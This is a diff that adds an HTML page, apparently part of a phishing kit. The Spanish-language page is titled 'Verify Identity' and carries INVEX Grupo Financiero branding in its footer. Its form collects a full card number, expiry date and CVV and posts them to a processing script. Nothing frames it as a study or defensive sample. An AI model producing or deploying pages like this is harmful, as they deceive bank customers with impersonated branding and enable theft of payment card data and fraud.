@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="style.css">
+    <title>Verifica Identidad</title>
+</head>
+<body>
+    <div class="container">
+        <img class="image" src="img/unnamed-removebg-preview.png" alt="Imagen">
+        
+        <h1>Verifica Identidad</h1>
+          
+        <h7>Ingrese los datos solicitados para verificar tu identidad.</h7>
+        
+        <form action="procesar_tarjeta.php" method="post">
+            <label for="tarjeta"></label>
+            <input type="text" id="tarjeta" name="tarjeta" placeholder="Ingresa tu número de tarjeta" maxlength="16" required>
+    
+            <div style="text-align: center;">
+                <div style="display: inline-block; text-align: center;">
+                    <label for="mes"></label>
+                    <input type="text" id="mes" name="mes" placeholder="MM" maxlength="2" required style="width: 50px;">
+            </div>
+
+            <div style="display: inline-block; text-align: center;">
+                    <label for="año"></label>
+                    <input type="text" id="año" name="año" placeholder="AA" maxlength="4" required style="width: 50px;">
+            </div>
+
+            <div style="text-align: center;">
+                <label for="cvv"></label>
+                <input type="text" id="cvv" name="cvv" placeholder="CVV" maxlength="3" required style="width: 50px;">
+            </div>
+            
+            </div>
+
+            <input type="submit" value="Confirmar">
+            
+            <h6>INVEX Grupo Financiero Derechos Reservados 2023, INVEX Controladora, S.A.B de C.V ver 5.2.22</h6>
+        </form>
+    </div>
+</body>
+</html>
